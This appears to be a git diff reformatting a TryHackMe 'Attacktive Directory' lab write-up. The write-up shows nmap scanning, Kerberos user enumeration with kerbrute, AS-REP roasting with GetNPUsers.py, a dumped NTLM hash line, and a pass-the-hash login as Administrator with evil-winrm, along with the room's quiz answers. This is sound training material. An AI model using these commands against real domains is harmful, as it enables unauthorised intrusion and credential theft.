@@ -13,24 +13,28 @@
 Room Link: [https://tryhackme.com/r/room/attacktivedirectory](https://tryhackme.com/r/room/attacktivedirectory)
 
 ## Tools
-1. [NMap](NMap.org)
-2. [kerbrute](https://github.com/ropnop/kerbrute/releases)
-3. [Impacket](https://github.com/fortra/impacket)
-4. [hashcat](https://hashcat.net/hashcat/)
-5. [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
-6. [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
+
+- [NMap](NMap.org)
+- [kerbrute](https://github.com/ropnop/kerbrute/releases)
+- [Impacket](https://github.com/fortra/impacket)
+- [hashcat](https://hashcat.net/hashcat/)
+- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
+- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
 
 ## Deploy The Machine
-1. Goto Access and get ovpn file to connect https://tryhackme.com/access Or, Start attackbox for testing.
-2. `Start Machine` and get Target IP from "Target Machine Information".
-3. Now, Click on all four Completes.
+
+- Goto Access and get ovpn file to connect https://tryhackme.com/access Or, Start attackbox for testing.
+- `Start Machine` and get Target IP from "Target Machine Information".
+- Now, Click on all four Completes.
 
 ## Setup
-1. Follow Instructions in this section, to `Install Impacket, Bloodhound and Neo4j`.
-2. After installing click on `Complete`.
+
+- Follow Instructions in this section, to `Install Impacket, Bloodhound and Neo4j`.
+- After installing click on `Complete`.
 
 ## Welcome to Attacktive Directory
-1. Running nmap scan shows some open ports, command used `nmap -sV -sC 10.10.94.138`.
+
+- Running nmap scan shows some open ports, command used `nmap -sV -sC 10.10.94.138`.
    ```bash
    nmap -sV -sC 10.10.94.138
    Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-24 12:12 IST
@@ -80,14 +84,15 @@ Room Link: [https://tryhackme.com/r/room/attacktivedirectory](https://tryhackme.
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 449.40 seconds
    ```
-2. Question `What tool will allow us to enumerate port 139/445?` Answer `enum4linux`. `enum4linux` can be used to enumerate `139`/`445` ports.
-3. Question `What is the NetBIOS-Domain Name of the machine?` Answer `THM-AD`
-4. Question `What invalid TLD do people commonly use for their Active Directory Domain?` Answer `.local`
+- Question `What tool will allow us to enumerate port 139/445?` Answer `enum4linux`. `enum4linux` can be used to enumerate `139`/`445` ports.
+- Question `What is the NetBIOS-Domain Name of the machine?` Answer `THM-AD`
+- Question `What invalid TLD do people commonly use for their Active Directory Domain?` Answer `.local`
 
 ## Enumerating Users via Kerberos
-1. Now, we will bruteforce Kerberos with [kerbrute](https://github.com/ropnop/kerbrute/releases) using given `userlist.txt` and `passwordlist.txt`. So, at first we need to download those wordlists and install `kerbrute`.
-2. Assign `spookysec.local` to machine ip is in `host` file. We can simply edit `/etc/hosts` file in Linux to assign domain to the ip.
-3. We can use this command `kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt` to enumerate users. We got some valid usernames after scanning.
+
+- Now, we will bruteforce Kerberos with [kerbrute](https://github.com/ropnop/kerbrute/releases) using given `userlist.txt` and `passwordlist.txt`. So, at first we need to download those wordlists and install `kerbrute`.
+- Assign `spookysec.local` to machine ip is in `host` file. We can simply edit `/etc/hosts` file in Linux to assign domain to the ip.
+- We can use this command `kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt` to enumerate users. We got some valid usernames after scanning.
    ```bash
    james@spookysec.local
    svc-admin@spookysec.local
@@ -97,13 +102,14 @@ Room Link: [https://tryhackme.com/r/room/attacktivedirectory](https://tryhackme.
    backup@spookysec.local
    paradox@spookysec.local
    ```
-4. Question `What command within Kerbrute will allow us to enumerate valid usernames?` Answer `userenum`.
-5. Question `What notable account is discovered? (These should jump out at you)` Answer `svc-admin`. `svc-admin` typically suggests a `service account` (`svc`) with `administrative privileges` (`admin`).
-6. Question `What is the other notable account is discovered? (These should jump out at you)` Answer `backup`.
+- Question `What command within Kerbrute will allow us to enumerate valid usernames?` Answer `userenum`.
+- Question `What notable account is discovered? (These should jump out at you)` Answer `svc-admin`. `svc-admin` typically suggests a `service account` (`svc`) with `administrative privileges` (`admin`).
+- Question `What is the other notable account is discovered? (These should jump out at you)` Answer `backup`.
 
 ## Abusing Kerberos
-1. Read this section, then proceed.
-2. We can use `GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass` or `GetNPUsers.py -dc-ip spookysec.local spookysec.local/ -no-pass -usersfile user.txt` after saving all users to `user.txt` to capture `TGT Token` of `svc-admin` using ASREPRoasting method.
+
+- Read this section, then proceed.
+- We can use `GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass` or `GetNPUsers.py -dc-ip spookysec.local spookysec.local/ -no-pass -usersfile user.txt` after saving all users to `user.txt` to capture `TGT Token` of `svc-admin` using ASREPRoasting method.
    
 ```bash
 GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
@@ -190,6 +196,7 @@ spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758
 - Question `Using a tool called Evil-WinRM what option will allow us to use a hash?` Answer `-H`
 
 ## Flag Submission Panel
+
 - We can login to administrator using `evil-winrm` with `evil-winrm -i spookysec.local -u Administrator -H 0e03632*******b0bcb4fc` command. We can get three flag files inside three directory.
 
 ```bash
